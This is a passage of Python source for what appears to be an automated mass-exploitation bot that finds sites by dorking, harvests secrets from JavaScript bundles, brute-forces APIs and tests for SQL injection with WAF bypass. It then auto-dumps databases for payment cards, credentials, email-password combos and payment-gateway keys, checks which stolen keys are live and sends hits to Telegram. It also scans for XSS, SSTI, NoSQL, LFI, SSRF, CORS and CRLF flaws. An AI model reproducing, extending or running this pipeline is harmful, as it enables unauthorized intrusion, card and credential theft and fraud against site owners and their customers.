                                        "value": secret.value,
                                        "time": datetime.now().isoformat(),
                                    })
                                    self.db.add_secret(
                                        url, secret.type, secret.key_name,
                                        secret.value, secret.category,
                                        secret.confidence,
                                    )
                                    if secret.confidence >= 0.80:
                                        await self.reporter.report_secret(
                                            url, secret.type, secret.key_name,
                                            secret.value, secret.category,
                                        )
                    
                    # ─── Step 3b: JS Bundle Analysis ───────────────────────────
                    # Parse webpack/Next.js/Vite chunks for hidden API endpoints,
                    # secrets, page routes, GraphQL schemas, env vars, source maps
                    js_analysis_result = None
                    detected_framework = ""
                    
                    if getattr(self.config, 'js_analysis_enabled', True):
                        try:
                            # Pass cookies we've collected so far for auth'd JS fetching
                            collected_cookies = result.get("cookies", {}).get("all", {})
                            crawl_html = None
                            if crawl_result and hasattr(crawl_result, 'html_pages') and crawl_result.html_pages:
                                crawl_html = crawl_result.html_pages[0].html if crawl_result.html_pages else None
                            
                            js_analysis_result = await analyze_js_bundles(
                                url,
                                cookies=collected_cookies if collected_cookies else None,
                                html_content=crawl_html,
                            )
                            detected_framework = js_analysis_result.framework or ""
                            
                            if js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes:
                                result["js_analysis"] = {
                                    "framework": detected_framework,
                                    "build_tool": js_analysis_result.build_tool,
                                    "js_files": js_analysis_result.js_files_analyzed,
                                    "js_bytes": js_analysis_result.total_js_bytes,
                                    "api_endpoints": len(js_analysis_result.api_endpoints),
                                    "secrets": len(js_analysis_result.secrets),
                                    "routes": len(js_analysis_result.page_routes),
                                    "graphql": len(js_analysis_result.graphql_endpoints) if js_analysis_result.graphql_endpoints else 0,
                                    "websockets": len(js_analysis_result.websocket_urls) if js_analysis_result.websocket_urls else 0,
                                    "source_maps": len(js_analysis_result.source_maps) if js_analysis_result.source_maps else 0,
                                    "env_vars": len(js_analysis_result.env_vars) if js_analysis_result.env_vars else 0,
                                }
                                
                                # Feed JS-discovered endpoints into param URL set for SQLi testing
                                base_parsed = urlparse(url)
                                base_domain = base_parsed.netloc
                                
                                for ep in js_analysis_result.api_endpoints:
                                    ep_parsed = urlparse(ep.url)
                                    if ep_parsed.netloc == base_domain or not ep_parsed.netloc:
                                        full_ep = ep.url if ep_parsed.netloc else f"{base_parsed.scheme}://{base_domain}{ep.url}"
                                        discovered_param_urls.add(full_ep)
                                
                                # Add page routes as URLs to test
                                for route in js_analysis_result.page_routes:
                                    if route.startswith("/"):
                                        discovered_param_urls.add(f"{base_parsed.scheme}://{base_domain}{route}")
                                
                                # JS-discovered secrets → into result + report
                                for s in js_analysis_result.secrets:
                                    secret_obj_type = getattr(s, 'secret_type', 'unknown')
                                    secret_val = getattr(s, 'value', '')
                                    secret_key = getattr(s, 'key_name', '')
                                    secret_conf = getattr(s, 'confidence', 0.5)
                                    result["secrets"].append({
                                        "type": secret_obj_type,
                                        "name": secret_key,
                                        "value": secret_val,
                                        "category": "js_bundle",
                                    })
                                    self.db.add_secret(url, secret_obj_type, secret_key, secret_val, "js_bundle", secret_conf)
                                    self.found_secrets.append({
                                        "url": url, "type": secret_obj_type,
                                        "value": secret_val, "time": datetime.now().isoformat(),
                                    })
                                    if secret_conf >= 0.80:
                                        await self.reporter.report_secret(
                                            url, secret_obj_type, secret_key, secret_val, "js_bundle",
                                        )
                                
                                # Report summary to Telegram
                                js_msg = (
                                    f"🔬 <b>JS Bundle Analysis</b>\n"
                                    f"<code>{url[:60]}</code>\n"
                                    f"📦 {js_analysis_result.js_files_analyzed} files, "
                                    f"{js_analysis_result.total_js_bytes // 1024} KB\n"
                                )
                                if detected_framework:
                                    js_msg += f"Framework: <b>{detected_framework}</b>\n"
                                if js_analysis_result.api_endpoints:
                                    js_msg += f"🎯 API Endpoints: <b>{len(js_analysis_result.api_endpoints)}</b>\n"
                                if js_analysis_result.secrets:
                                    js_msg += f"🔑 Secrets: <b>{len(js_analysis_result.secrets)}</b>\n"
                                if js_analysis_result.page_routes:
                                    js_msg += f"📍 Routes: <b>{len(js_analysis_result.page_routes)}</b>\n"
                                if js_analysis_result.graphql_endpoints:
                                    js_msg += f"📊 GraphQL: {len(js_analysis_result.graphql_endpoints)}\n"
                                if js_analysis_result.source_maps:
                                    js_msg += f"📁 Source Maps: {len(js_analysis_result.source_maps)} (LEAKED!)\n"
                                if js_analysis_result.env_vars:
                                    js_msg += f"🌐 Env Vars: {len(js_analysis_result.env_vars)} leaked\n"
                                
                                await self.reporter.report_finding(url, js_msg)
                                logger.info(
                                    f"[JS] {url[:50]} → {len(js_analysis_result.api_endpoints)} endpoints, "
                                    f"{len(js_analysis_result.secrets)} secrets, {len(js_analysis_result.page_routes)} routes"
                                )
                        except Exception as e:
                            logger.warning(f"[JS] Analysis failed for {url[:60]}: {e}")
                    
                    # ─── Step 3c: API Endpoint Bruteforce ──────────────────────
                    # Probe common REST/GraphQL paths, OpenAPI specs, admin panels
                    if getattr(self.config, 'api_bruteforce_enabled', True):
                        try:
                            # Build custom paths from JS discoveries
                            custom_paths = []
                            if js_analysis_result and js_analysis_result.page_routes:
                                for route in js_analysis_result.page_routes:
                                    if route.startswith("/"):
                                        custom_paths.append(route)
                                        if not route.startswith("/api/"):
                                            custom_paths.append(f"/api{route}")
                            
                            collected_cookies = result.get("cookies", {}).get("all", {})
                            
                            api_brute_result = await bruteforce_api(
                                url=url,
                                framework=detected_framework,
                                cookies=collected_cookies if collected_cookies else None,
                                custom_paths=custom_paths if custom_paths else None,
                            )
                            
                            if api_brute_result.endpoints_found:
                                result["api_bruteforce"] = {
                                    "probed": api_brute_result.endpoints_probed,
                                    "open": len(api_brute_result.open_endpoints),
                                    "auth_required": len(api_brute_result.auth_endpoints),
                                    "graphql_introspection": api_brute_result.graphql_introspection,
                                    "openapi_spec": api_brute_result.openapi_spec_url or None,
                                    "openapi_endpoints": len(api_brute_result.openapi_endpoints) if api_brute_result.openapi_endpoints else 0,
                                    "admin_panels": len(getattr(api_brute_result, 'admin_panels', []) or []),
                                }
                                
                                # Feed discovered endpoints into SQLi testing pool
                                for ep in api_brute_result.open_endpoints:
                                    ep_parsed = urlparse(ep.url)
                                    discovered_param_urls.add(ep.url)
                                    if ep_parsed.query:
                                        discovered_param_urls.add(ep.url)
                                
                                # Report to Telegram
                                bf_msg = (
                                    f"🔨 <b>API Bruteforce</b>\n"
                                    f"<code>{url[:60]}</code>\n"
                                    f"Probed: {api_brute_result.endpoints_probed}\n"
                                )
                                if api_brute_result.open_endpoints:
                                    bf_msg += f"✅ Open: <b>{len(api_brute_result.open_endpoints)}</b>\n"
                                    for ep in api_brute_result.open_endpoints[:3]:
                                        bf_msg += f"  {ep.method} <code>{ep.url[:60]}</code> [{ep.status}]\n"
                                if api_brute_result.auth_endpoints:
                                    bf_msg += f"🔒 Auth-required: <b>{len(api_brute_result.auth_endpoints)}</b>\n"
                                if api_brute_result.graphql_introspection:
                                    bf_msg += "📊 <b>GraphQL introspection OPEN!</b>\n"
                                if api_brute_result.openapi_spec_url:
                                    bf_msg += f"📋 OpenAPI: <code>{api_brute_result.openapi_spec_url[:60]}</code>\n"
                                    bf_msg += f"   Parsed: {len(api_brute_result.openapi_endpoints)} endpoints\n"
                                admin_panels = getattr(api_brute_result, 'admin_panels', None)
                                if admin_panels:
                                    bf_msg += f"🔐 Admin Panels: <b>{len(admin_panels)}</b>\n"
                                    for ap in admin_panels[:3]:
                                        bf_msg += f"  <code>{ap.url[:60]}</code>\n"
                                
                                await self.reporter.report_finding(url, bf_msg)
                                logger.info(
                                    f"[API] {url[:50]} → {len(api_brute_result.open_endpoints)} open, "
                                    f"{len(api_brute_result.auth_endpoints)} auth, "
                                    f"graphql={'YES' if api_brute_result.graphql_introspection else 'no'}"
                                )
                        except Exception as e:
                            logger.warning(f"[API] Bruteforce failed for {url[:60]}: {e}")
                    
                    # Step 4: SQLi Testing (now with cookie/header/POST injection + WAF bypass)
                    # Also test param URLs discovered by the recursive crawler
                    if self.config.sqli_enabled:
                      try:
                        sqli_results = await self.sqli_scanner.scan(

                            url, session,
                            waf_name=waf_name,
                            protection_info=waf_info,
                        )
                        if sqli_results:
                            result["sqli"] = [
                                {
                                    "param": r.parameter,
                                    "type": r.injection_type,
                                    "dbms": r.dbms,
                                    "technique": r.technique,
                                    "columns": r.column_count,
                                    "db_version": r.db_version,
                                    "current_db": r.current_db,
                                    "injection_point": r.injection_point,
                                }
                                for r in sqli_results
                            ]
                            
                            for sqli in sqli_results:
                                vuln_record = {
                                    "url": url,
                                    "param": sqli.parameter,
                                    "type": sqli.injection_type,
                                    "dbms": sqli.dbms,
                                    "technique": sqli.technique,
                                    "injection_point": sqli.injection_point,
                                    "confidence": sqli.confidence,
                                    "db_version": sqli.db_version,
                                    "current_db": sqli.current_db,
                                    "current_user": sqli.current_user,
                                    "column_count": sqli.column_count,
                                    "payload_used": sqli.payload_used,
                                    "prefix": getattr(sqli, 'prefix', "'"),
                                    "suffix": getattr(sqli, 'suffix', "-- -"),
                                    "time": datetime.now().isoformat(),
                                }
                                self.vulnerable_urls.append(vuln_record)
                                self.db.add_vulnerable_url(vuln_record)
                                
                                # Report vulnerability
                                await self.reporter.report_sqli_vuln(
                                    url, sqli.parameter, sqli.dbms,
                                    sqli.injection_type,
                                    {
                                        "db_version": sqli.db_version,
                                        "current_db": sqli.current_db,
                                        "column_count": sqli.column_count,
                                        "injection_point": sqli.injection_point,
                                    }
                                )
                                
                                # Step 5: Unified Auto-Dump (v3.18 — replaces old steps 5/5b)
                                # Uses AutoDumper to chain: best-dumper-selection → dump → deep-parse
                                # → key validation → hash ID → combo gen → file gen → TG upload → deeper tables
                                if self.config.dumper_enabled and self.auto_dumper:
                                    try:
                                        parsed = await self.auto_dumper.auto_dump(sqli, session)
                                        if parsed and parsed.total_rows > 0:
                                            result["dumps"].append({
                                                "source": parsed.source,
                                                "tables": len(parsed.tables_dumped),
                                                "rows": parsed.total_rows,
                                                "cards": len(parsed.cards),
                                                "creds": len(parsed.credentials),
                                                "keys": len(parsed.gateway_keys),
                                                "secrets": len(parsed.secrets),
                                                "valid_keys": len(parsed.valid_keys),
                                                "hashes": len(parsed.hashes),
                                                "emails": len(parsed.emails),
                                                "combos": len(parsed.combos_user_pass) + len(parsed.combos_email_pass),
                                                "files": list(parsed.files.keys()),
                                            })
                                            # Sync high-value finds to in-memory state
                                            if parsed.cards:
                                                self.found_cards.extend(parsed.cards)
                                            for key_entry in parsed.gateway_keys:
                                                self.found_gateways.append({
                                                    "url": url,
                                                    "type": key_entry.get("type", "db_key"),
                                                    "value": key_entry.get("value", ""),
                                                    "source": f"auto_dump_{parsed.source}",
                                                    "time": datetime.now().isoformat(),
                                                })
                                                # Auto-feed dump-discovered gateways to Mady
                                                if self.mady_feeder:
                                                    try:
                                                        fed = self.mady_feeder.feed_gateway(
                                                            url, key_entry.get("type", "db_key"),
                                                            key_entry.get("value", ""),
                                                            extra={"source": f"auto_dump_{parsed.source}"},
                                                        )
                                                        if fed:
                                                            result["mady_fed"] = result.get("mady_fed", 0) + 1
                                                    except Exception:
                                                        pass
                                            for vk in parsed.valid_keys:
                                                self.found_gateways.append({
                                                    "url": url,
                                                    "type": vk.get("type", "validated_key"),
                                                    "value": vk.get("value", ""),
                                                    "source": "auto_dump_validated",
                                                    "time": datetime.now().isoformat(),
                                                })
                                                # Auto-feed validated keys to Mady
                                                if self.mady_feeder:
                                                    try:
                                                        fed = self.mady_feeder.feed_gateway(
                                                            url, vk.get("type", "validated_key"),
                                                            vk.get("value", ""),
                                                            extra={"source": "auto_dump_validated"},
                                                        )
                                                        if fed:
                                                            result["mady_fed"] = result.get("mady_fed", 0) + 1
                                                    except Exception:
                                                        pass
                                    except Exception as e:
                                        logger.warning(f"Auto-dump error for {url}: {e}")
                                        # Fallback to legacy dumper on auto_dump failure
                                        if sqli.injection_type == "union":
                                            dump = await self.dumper.targeted_dump(sqli, session)
                                            if dump.has_valuable_data or dump.total_rows > 0:
                                                saved = self.dumper.save_dump(dump)
                                                result["dumps"].append({
                                                    "tables": len(dump.tables),
                                                    "rows": dump.total_rows,
                                                    "cards": len(dump.card_data),
                                                    "files": saved,
                                                })
                                                await self.reporter.report_data_dump(
                                                    url, dump.dbms, dump.database,
                                                    dump.tables,
                                                    {t: len(rows) for t, rows in dump.data.items()},
                                                    saved,
                                                )
                                
                                # Legacy fallback: if auto_dumper disabled, use old path
                                elif self.config.dumper_enabled and not self.auto_dumper:
                                    if sqli.injection_type == "union":
                                        dump = await self.dumper.targeted_dump(sqli, session)
                                        if dump.has_valuable_data or dump.total_rows > 0:
                                            saved = self.dumper.save_dump(dump)
                                            result["dumps"].append({
                                                "tables": len(dump.tables), "rows": dump.total_rows,
                                                "cards": len(dump.card_data), "files": saved,
                                            })
                                            await self.reporter.report_data_dump(
                                                url, dump.dbms, dump.database, dump.tables,
                                                {t: len(rows) for t, rows in dump.data.items()}, saved,
                                            )
                                    elif (self.config.dumper_blind_enabled and
                                          sqli.injection_type in ("boolean", "time")):
                                        dump = await self.dumper.blind_targeted_dump(sqli, session)
                                        if dump.has_valuable_data or dump.total_rows > 0:
                                            saved = self.dumper.save_dump(dump, prefix="blind_")
                                            result["dumps"].append({
                                                "type": f"blind_{sqli.injection_type}",
                                                "tables": len(dump.tables), "rows": dump.total_rows,
                                                "files": saved,
                                            })
                      except Exception as e:
                        logger.warning(f"SQLi scan failed for {url}: {e}")
                    
                    # Step 6: SQLi on crawler-discovered param URLs (v3.9)
                    if (self.config.sqli_enabled and discovered_param_urls and 
                            self.crawler and crawl_result):
                        crawl_sqli_limit = getattr(self.config, 'deep_crawl_sqli_limit', 5)
                        # Filter out the original URL (already tested above)
                        extra_targets = [u for u in discovered_param_urls if u != url]
                        # Skip URLs whose param values contain full URLs (causes SSRF-like hangs)
                        def _safe_param_url(u):
                            try:
                                from urllib.parse import parse_qs, urlparse as _up
                                qs = parse_qs(_up(u).query)
                                for vals in qs.values():
                                    for v in vals:
                                        if v.startswith(("http://", "https://")):
                                            return False
                            except Exception:
                                pass
                            return True
                        extra_targets = [u for u in extra_targets if _safe_param_url(u)]
                        if extra_targets:
                            extra_targets = extra_targets[:crawl_sqli_limit]
                            for extra_url in extra_targets:
                                try:
                                    extra_sqli = await asyncio.wait_for(
                                        self.sqli_scanner.scan(
                                            extra_url, session,
                                            waf_name=waf_name,
                                            protection_info=waf_info,
                                        ),
                                        timeout=45,
                                    )
                                    if extra_sqli:
                                        for sqli in extra_sqli:
                                            vuln_record = {
                                                "url": extra_url,
                                                "param": sqli.parameter,
                                                "type": sqli.injection_type,
                                                "dbms": sqli.dbms,
                                                "technique": sqli.technique,
                                                "injection_point": sqli.injection_point,
                                                "confidence": sqli.confidence,
                                                "db_version": sqli.db_version,
                                                "current_db": sqli.current_db,
                                                "current_user": sqli.current_user,
                                                "column_count": sqli.column_count,
                                                "payload_used": sqli.payload_used,
                                                "time": datetime.now().isoformat(),
                                                "source": "recursive_crawl",
                                            }
                                            self.vulnerable_urls.append(vuln_record)
                                            self.db.add_vulnerable_url(vuln_record)
                                            result["sqli"].append({
                                                "param": sqli.parameter,
                                                "type": sqli.injection_type,
                                                "dbms": sqli.dbms,
                                                "technique": sqli.technique,
                                                "columns": sqli.column_count,
                                                "db_version": sqli.db_version,
                                                "current_db": sqli.current_db,
                                                "injection_point": sqli.injection_point,
                                                "source_url": extra_url,
                                            })
                                            await self.reporter.report_sqli_vuln(
                                                extra_url, sqli.parameter, sqli.dbms,
                                                sqli.injection_type,
                                                {
                                                    "db_version": sqli.db_version,
                                                    "current_db": sqli.current_db,
                                                    "column_count": sqli.column_count,
                                                    "injection_point": sqli.injection_point,
                                                    "source": "Discovered via recursive crawl",
                                                }
                                            )
                                except asyncio.TimeoutError:
                                    logger.warning(f"Crawl-discovered SQLi test timed out for {extra_url}")
                                except Exception as e:
                                    logger.debug(f"Crawl-discovered SQLi test failed for {extra_url}: {e}")

                    # Step 7: ML False Positive Filter on SQLi results (v3.14)
                    if self.ml_filter and result.get("sqli"):
                        filtered_sqli = []
                        for sqli_entry in result["sqli"]:
                            # Build a lightweight object the ML filter can read attrs from
                            class _SQLiProxy:
                                pass
                            proxy = _SQLiProxy()
                            proxy.url = sqli_entry.get("source_url", url)
                            proxy.parameter = sqli_entry.get("param", "")
                            proxy.injection_type = sqli_entry.get("type", "")
                            proxy.dbms = sqli_entry.get("dbms", "")
                            proxy.confidence = sqli_entry.get("confidence", 0.5)
                            proxy.column_count = sqli_entry.get("columns", 0)
                            proxy.payload_used = sqli_entry.get("payload_used", "")
                            proxy.technique = sqli_entry.get("technique", "")
                            proxy.db_version = sqli_entry.get("db_version", "")
                            try:
                                fr = self.ml_filter.filter_sqli(sqli_result=proxy)
                                if fr.is_positive:
                                    sqli_entry["ml_confidence"] = fr.confidence
                                    filtered_sqli.append(sqli_entry)
                                else:
                                    logger.info(f"🧠 ML filter rejected SQLi on {url} param={sqli_entry.get('param')} "
                                               f"(score={fr.score:.2f}, threshold={self.config.ml_filter_threshold})")
                            except Exception as e:
                                logger.debug(f"ML filter error: {e}")
                                filtered_sqli.append(sqli_entry)  # Keep on error
                        result["sqli"] = filtered_sqli

                    # Step 8: OOB SQLi Testing (v3.11)
                    if self.oob_injector and self.config.sqli_enabled:
                        try:
                            oob_result = await self.oob_injector.test_and_report(url, session)
                            if oob_result and oob_result.vulnerable:
                                result["oob"].append({
                                    "parameter": oob_result.parameter,
                                    "dbms": oob_result.dbms,
                                    "channel": oob_result.channel,
                                    "extraction": oob_result.extraction,
                                    "callbacks": oob_result.callbacks_received,
                                })
                        except Exception as e:
                            logger.debug(f"OOB SQLi test failed: {e}")

                    # Step 9: Enhanced Union Dumping for non-MySQL DBMS (v3.12)
                    if self.union_dumper and result.get("sqli"):
                        for sqli_entry in result["sqli"]:
                            dbms = sqli_entry.get("dbms", "").lower()
                            # Use multi-DBMS dumper for confirmed union SQLi
                            if sqli_entry.get("type") == "union" and dbms in ("mssql", "postgresql", "oracle", "sqlite"):
                                try:
                                    union_result = await self.union_dumper.dump(
                                        url=sqli_entry.get("source_url", url),
                                        parameter=sqli_entry.get("param", ""),
                                        session=session,
                                        dbms_hint=dbms,
                                        prefix=sqli_entry.get("prefix", "'"),
                                    )
                                    if union_result and union_result.rows_extracted > 0:
                                        result["dumps"].append({
                                            "type": f"union_{dbms}",
                                            "dbms": union_result.dbms,
                                            "tables": union_result.total_tables,
                                            "rows": union_result.rows_extracted,
                                            "version": union_result.version,
                                            "user": union_result.current_user,
                                            "database": union_result.current_db,
                                        })
                                        await self.reporter.report_data_dump(
                                            sqli_entry.get("source_url", url),
                                            union_result.dbms,
                                            union_result.current_db,
                                            list(union_result.tables.keys()),
                                            {t: len(cols) for t, cols in union_result.tables.items()},
                                            [],
                                        )
                                except Exception as e:
                                    logger.debug(f"Multi-DBMS union dump failed: {e}")

                    # Step 10: API Key Validation on discovered secrets (v3.13)
                    if self.key_validator and result.get("secrets"):
                        try:
                            keys_to_validate = []
                            for s in result["secrets"]:
                                detected = self.key_validator.detect_keys(s.get("value", ""))
                                keys_to_validate.extend(detected)
                            
                            if keys_to_validate:
                                batch = await self.key_validator.validate_and_report(
                                    keys_to_validate, url, session,
                                )
                                if batch:
                                    result["key_validations"] = [
                                        {
                                            "key_type": v.key_type,
                                            "is_live": v.is_live,
                                            "confidence": v.confidence,
                                            "risk_level": v.risk_level,
                                            "display_key": v.display_key,
                                        }
                                        for v in batch.results
                                    ]
                        except Exception as e:
                            logger.debug(f"Key validation failed: {e}")

                    # Step 10b: ML filter on discovered secrets (v3.14)
                    if self.ml_filter and result.get("secrets"):
                        filtered_secrets = []
                        for s in result["secrets"]:
                            secret_match = {
                                "url": url,
                                "type": s.get("type", ""),
                                "value": s.get("value", ""),
                                "confidence": 0.8,
                                "key_name": s.get("name", ""),
                                "category": s.get("category", ""),
                            }
                            try:
                                fr = self.ml_filter.filter_secret(secret_match=secret_match)
                                if fr.is_positive:
                                    s["ml_confidence"] = fr.confidence
                                    filtered_secrets.append(s)
                                else:
                                    logger.debug(f"🧠 ML filter rejected secret {s.get('type')} on {url}")
                            except Exception as e:
                                logger.debug(f"ML filter secret error: {e}")
                                filtered_secrets.append(s)  # Keep on error
                        result["secrets"] = filtered_secrets

                    # ══════════════════════════════════════════════════════
                    # Steps 11-18: Extended Vulnerability Scanners (v3.17)
                    # ══════════════════════════════════════════════════════

                    # Step 11: XSS Testing
                    if self.xss_scanner:
                        try:
                            xss_results = await self.xss_scanner.scan(url, session, waf_name=waf_name)
                            if xss_results:
                                result["xss"] = [
                                    {"param": r.parameter, "type": r.xss_type, "context": r.context,
                                     "payload": r.payload_used[:80], "confidence": r.confidence}
                                    for r in xss_results
                                ]
                                for xr in xss_results:
                                    await self.reporter.send_message(
                                        f"🎯 <b>XSS Found!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{xr.parameter}</code>\n"
                                        f"Type: {xr.xss_type} | Context: {xr.context}\n"
                                        f"Confidence: {xr.confidence:.0%}"
                                    )
                        except Exception as e:
                            logger.debug(f"XSS scan error: {e}")

                    # Step 12: SSTI Testing
                    if self.ssti_scanner:
                        try:
                            ssti_results = await self.ssti_scanner.scan(url, session, waf_name=waf_name)
                            if ssti_results:
                                result["ssti"] = [
                                    {"param": r.parameter, "engine": r.engine, "rce": r.rce_confirmed,
                                     "payload": r.payload_used[:80], "confidence": r.confidence}
                                    for r in ssti_results
                                ]
                                for sr in ssti_results:
                                    await self.reporter.send_message(
                                        f"🔥 <b>SSTI Found!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{sr.parameter}</code>\n"
                                        f"Engine: {sr.engine} | RCE: {'YES' if sr.rce_confirmed else 'No'}\n"
                                        f"Confidence: {sr.confidence:.0%}"
                                    )
                        except Exception as e:
                            logger.debug(f"SSTI scan error: {e}")

                    # Step 13: NoSQL Injection Testing
                    if self.nosql_scanner:
                        try:
                            nosql_results = await self.nosql_scanner.scan(url, session, waf_name=waf_name)
                            if nosql_results:
                                result["nosql"] = [
                                    {"param": r.parameter, "type": r.nosql_type, "db": r.db_type,
                                     "auth_bypass": r.auth_bypass, "confidence": r.confidence}
                                    for r in nosql_results
                                ]
                                for nr in nosql_results:
                                    await self.reporter.send_message(
                                        f"🍃 <b>NoSQL Injection!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{nr.parameter}</code>\n"
                                        f"DB: {nr.db_type} | Type: {nr.nosql_type}\n"
                                        f"Auth Bypass: {'YES' if nr.auth_bypass else 'No'}"
                                    )
                        except Exception as e:
                            logger.debug(f"NoSQL scan error: {e}")

                    # Step 13b: NoSQL Dump (auto_dumper blind extraction after NoSQL injection)
                    if (self.auto_dumper and result.get("nosql") and
                            getattr(self.config, 'auto_dump_nosql', True)):
                        try:
                            nosql_parsed = await self.auto_dumper.nosql_dump(
                                url, nosql_results, session
                            )
                            if nosql_parsed and nosql_parsed.total_rows > 0:
                                result["dumps"].append({
                                    "source": "nosql_blind",
                                    "rows": nosql_parsed.total_rows,
                                    "creds": len(nosql_parsed.credentials),
                                    "secrets": len(nosql_parsed.secrets),
                                    "emails": len(nosql_parsed.emails),
                                })
                        except Exception as e:
                            logger.debug(f"NoSQL dump error: {e}")

                    # Step 14: LFI / Path Traversal Testing
                    if self.lfi_scanner:
                        try:
                            lfi_results = await self.lfi_scanner.scan(url, session, waf_name=waf_name)
                            if lfi_results:
                                result["lfi"] = [
                                    {"param": r.parameter, "type": r.lfi_type, "file": r.file_read,
                                     "os": r.os_detected, "confidence": r.confidence}
                                    for r in lfi_results
                                ]
                                for lr in lfi_results:
                                    await self.reporter.send_message(
                                        f"📂 <b>LFI/Path Traversal!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{lr.parameter}</code>\n"
                                        f"File: {lr.file_read} | OS: {lr.os_detected}\n"
                                        f"Type: {lr.lfi_type} | Confidence: {lr.confidence:.0%}"
                                    )
                        except Exception as e:
                            logger.debug(f"LFI scan error: {e}")

                    # Step 15: SSRF Testing
                    if self.ssrf_scanner:
                        try:
                            ssrf_results = await self.ssrf_scanner.scan(url, session, waf_name=waf_name)
                            if ssrf_results:
                                result["ssrf"] = [
                                    {"param": r.parameter, "type": r.ssrf_type,
                                     "target": r.target_reached, "cloud": r.cloud_provider,
                                     "confidence": r.confidence}
                                    for r in ssrf_results
                                ]
                                for sr in ssrf_results:
                                    await self.reporter.send_message(
                                        f"🌐 <b>SSRF Found!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{sr.parameter}</code>\n"
                                        f"Target: {sr.target_reached}\n"
                                        f"{'Cloud: ' + sr.cloud_provider if sr.cloud_provider else ''}"
                                    )
                        except Exception as e:
                            logger.debug(f"SSRF scan error: {e}")

                    # Step 16: CORS Misconfiguration Testing
                    if self.cors_scanner:
                        try:
                            cors_results = await self.cors_scanner.scan(url, session, waf_name=waf_name)
                            if cors_results:
                                result["cors"] = [
                                    {"type": r.cors_type, "origin": r.payload_origin,
                                     "acao": r.acao_header, "creds": r.acac_header}
                                    for r in cors_results
                                ]
                                for cr in cors_results:
                                    await self.reporter.send_message(
                                        f"🔓 <b>CORS Misconfig!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Type: {cr.cors_type}\n"
                                        f"ACAO: {cr.acao_header} | Creds: {cr.acac_header}"
                                    )
                        except Exception as e:
                            logger.debug(f"CORS scan error: {e}")

                    # Step 17: Open Redirect Testing
                    if self.redirect_scanner:
                        try:
                            redir_results = await self.redirect_scanner.scan(url, session, waf_name=waf_name)
                            if redir_results:
                                result["redirects"] = [
                                    {"param": r.parameter, "type": r.redirect_type,
                                     "final_url": r.final_url[:80]}
                                    for r in redir_results
                                ]
                                for rr in redir_results:
                                    await self.reporter.send_message(
                                        f"↪️ <b>Open Redirect!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{rr.parameter}</code>\n"
                                        f"Redirects to: {rr.final_url[:60]}"
                                    )
                        except Exception as e:
                            logger.debug(f"Redirect scan error: {e}")

                    # Step 18: CRLF Injection Testing
                    if self.crlf_scanner:
                        try:
                            crlf_results = await self.crlf_scanner.scan(url, session, waf_name=waf_name)
                            if crlf_results:
                                result["crlf"] = [
                                    {"param": r.parameter, "type": r.crlf_type,
                                     "header": r.injected_header}
                                    for r in crlf_results
                                ]
                                for cr in crlf_results:
                                    await self.reporter.send_message(
                                        f"💉 <b>CRLF Injection!</b>\n"
                                        f"URL: <code>{url[:80]}</code>\n"
                                        f"Param: <code>{cr.parameter}</code>\n"
                                        f"Injected: {cr.injected_header}"
                                    )
                        except Exception as e:
                            logger.debug(f"CRLF scan error: {e}")

                    # Record scan in DB
                    findings_count = len(result.get("secrets", [])) + len(result.get("sqli", []))
                    findings_count += sum(len(result.get(k, [])) for k in ("xss", "ssti", "nosql", "lfi", "ssrf", "cors", "redirects", "crlf"))
                    self.db.add_scan_record(url, "auto", findings_count)
                    
                    # Reset circuit breaker on success
                    self.db.reset_domain_failure(domain)
        
        except asyncio.TimeoutError:
            logger.debug(f"Timeout processing {url}")
            self.db.record_domain_failure(domain)
        except aiohttp.ClientError as e:
            logger.debug(f"Connection error for {url}: {e}")
            self.db.record_domain_failure(domain)
        except Exception as e:
            logger.error(f"Pipeline error for {url}: {e}")
        
        return result

    async def _process_url_safe(self, url: str, results_list: list, findings_counter: list):
        """Process a URL with error handling for concurrent use."""
        try:
            result = await asyncio.wait_for(
                self.process_url(url),
                timeout=180,  # 3 min max per URL
            )
            results_list.append(result)
            
            # Log findings
            findings = []
            if result.get("secrets"):
                findings.append(f"{len(result['secrets'])} secrets")
            if result.get("sqli"):
                findings.append(f"{len(result['sqli'])} SQLi vulns")
            if result.get("dumps"):
                findings.append(f"{len(result['dumps'])} dumps")
            if result.get("cookies", {}).get("b3"):
                findings.append(f"B3 cookies")
            # Cookie Hunter results
            hunt = result.get("cookie_hunt", {})
            if hunt.get("b3"):
                findings.append(f"{len(hunt['b3'])} B3 traced")
            if hunt.get("gateway"):
                gws = set(g.get("gateway", "?") for g in hunt["gateway"])
                findings.append(f"{len(hunt['gateway'])} gateway cookies ({', '.join(gws)})")
            if hunt.get("detected_gateways"):
                findings.append(f"gateways: {', '.join(hunt['detected_gateways'])}")
            # Recursive crawl results
            crawl = result.get("crawl", {})
            if crawl.get("pages_fetched"):
                findings.append(
                    f"crawled {crawl['pages_fetched']}pg d{crawl['max_depth']} "
                    f"({crawl['param_urls']} params)"
                )
            # Extended vuln scanner results (v3.17)
            for vkey, vlabel in [("xss", "XSS"), ("ssti", "SSTI"), ("nosql", "NoSQL"),
                                  ("lfi", "LFI"), ("ssrf", "SSRF"), ("cors", "CORS"),
                                  ("redirects", "Redirect"), ("crlf", "CRLF")]:
                if result.get(vkey):
                    findings.append(f"{len(result[vkey])} {vlabel}")
            
            if findings:
                findings_counter.append(1)
                logger.info(f"  FOUND: {', '.join(findings)} at {url[:60]}")
                await self._send_progress(
                    f"🎯 <b>HIT!</b> {', '.join(findings)}\n"
                    f"<code>{url[:80]}</code>"
                )
                # Auto-export every N hits
                self._hits_since_export += 1
                if self._hits_since_export >= self._auto_export_threshold:
                    self._hits_since_export = 0
                    try:
                        filepath = await self._write_export()
                        if filepath:
                            await self._send_export_file(filepath)
                    except Exception as e:
                        logger.debug(f"Auto-export error: {e}")
        except asyncio.TimeoutError:
            logger.warning(f"URL processing timed out (180s): {url[:60]}")
        except Exception as e:
            logger.debug(f"URL processing error: {url} — {e}")

    async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
        """Run one cycle of dorking + processing with concurrent URL scanning.
        
        Features:
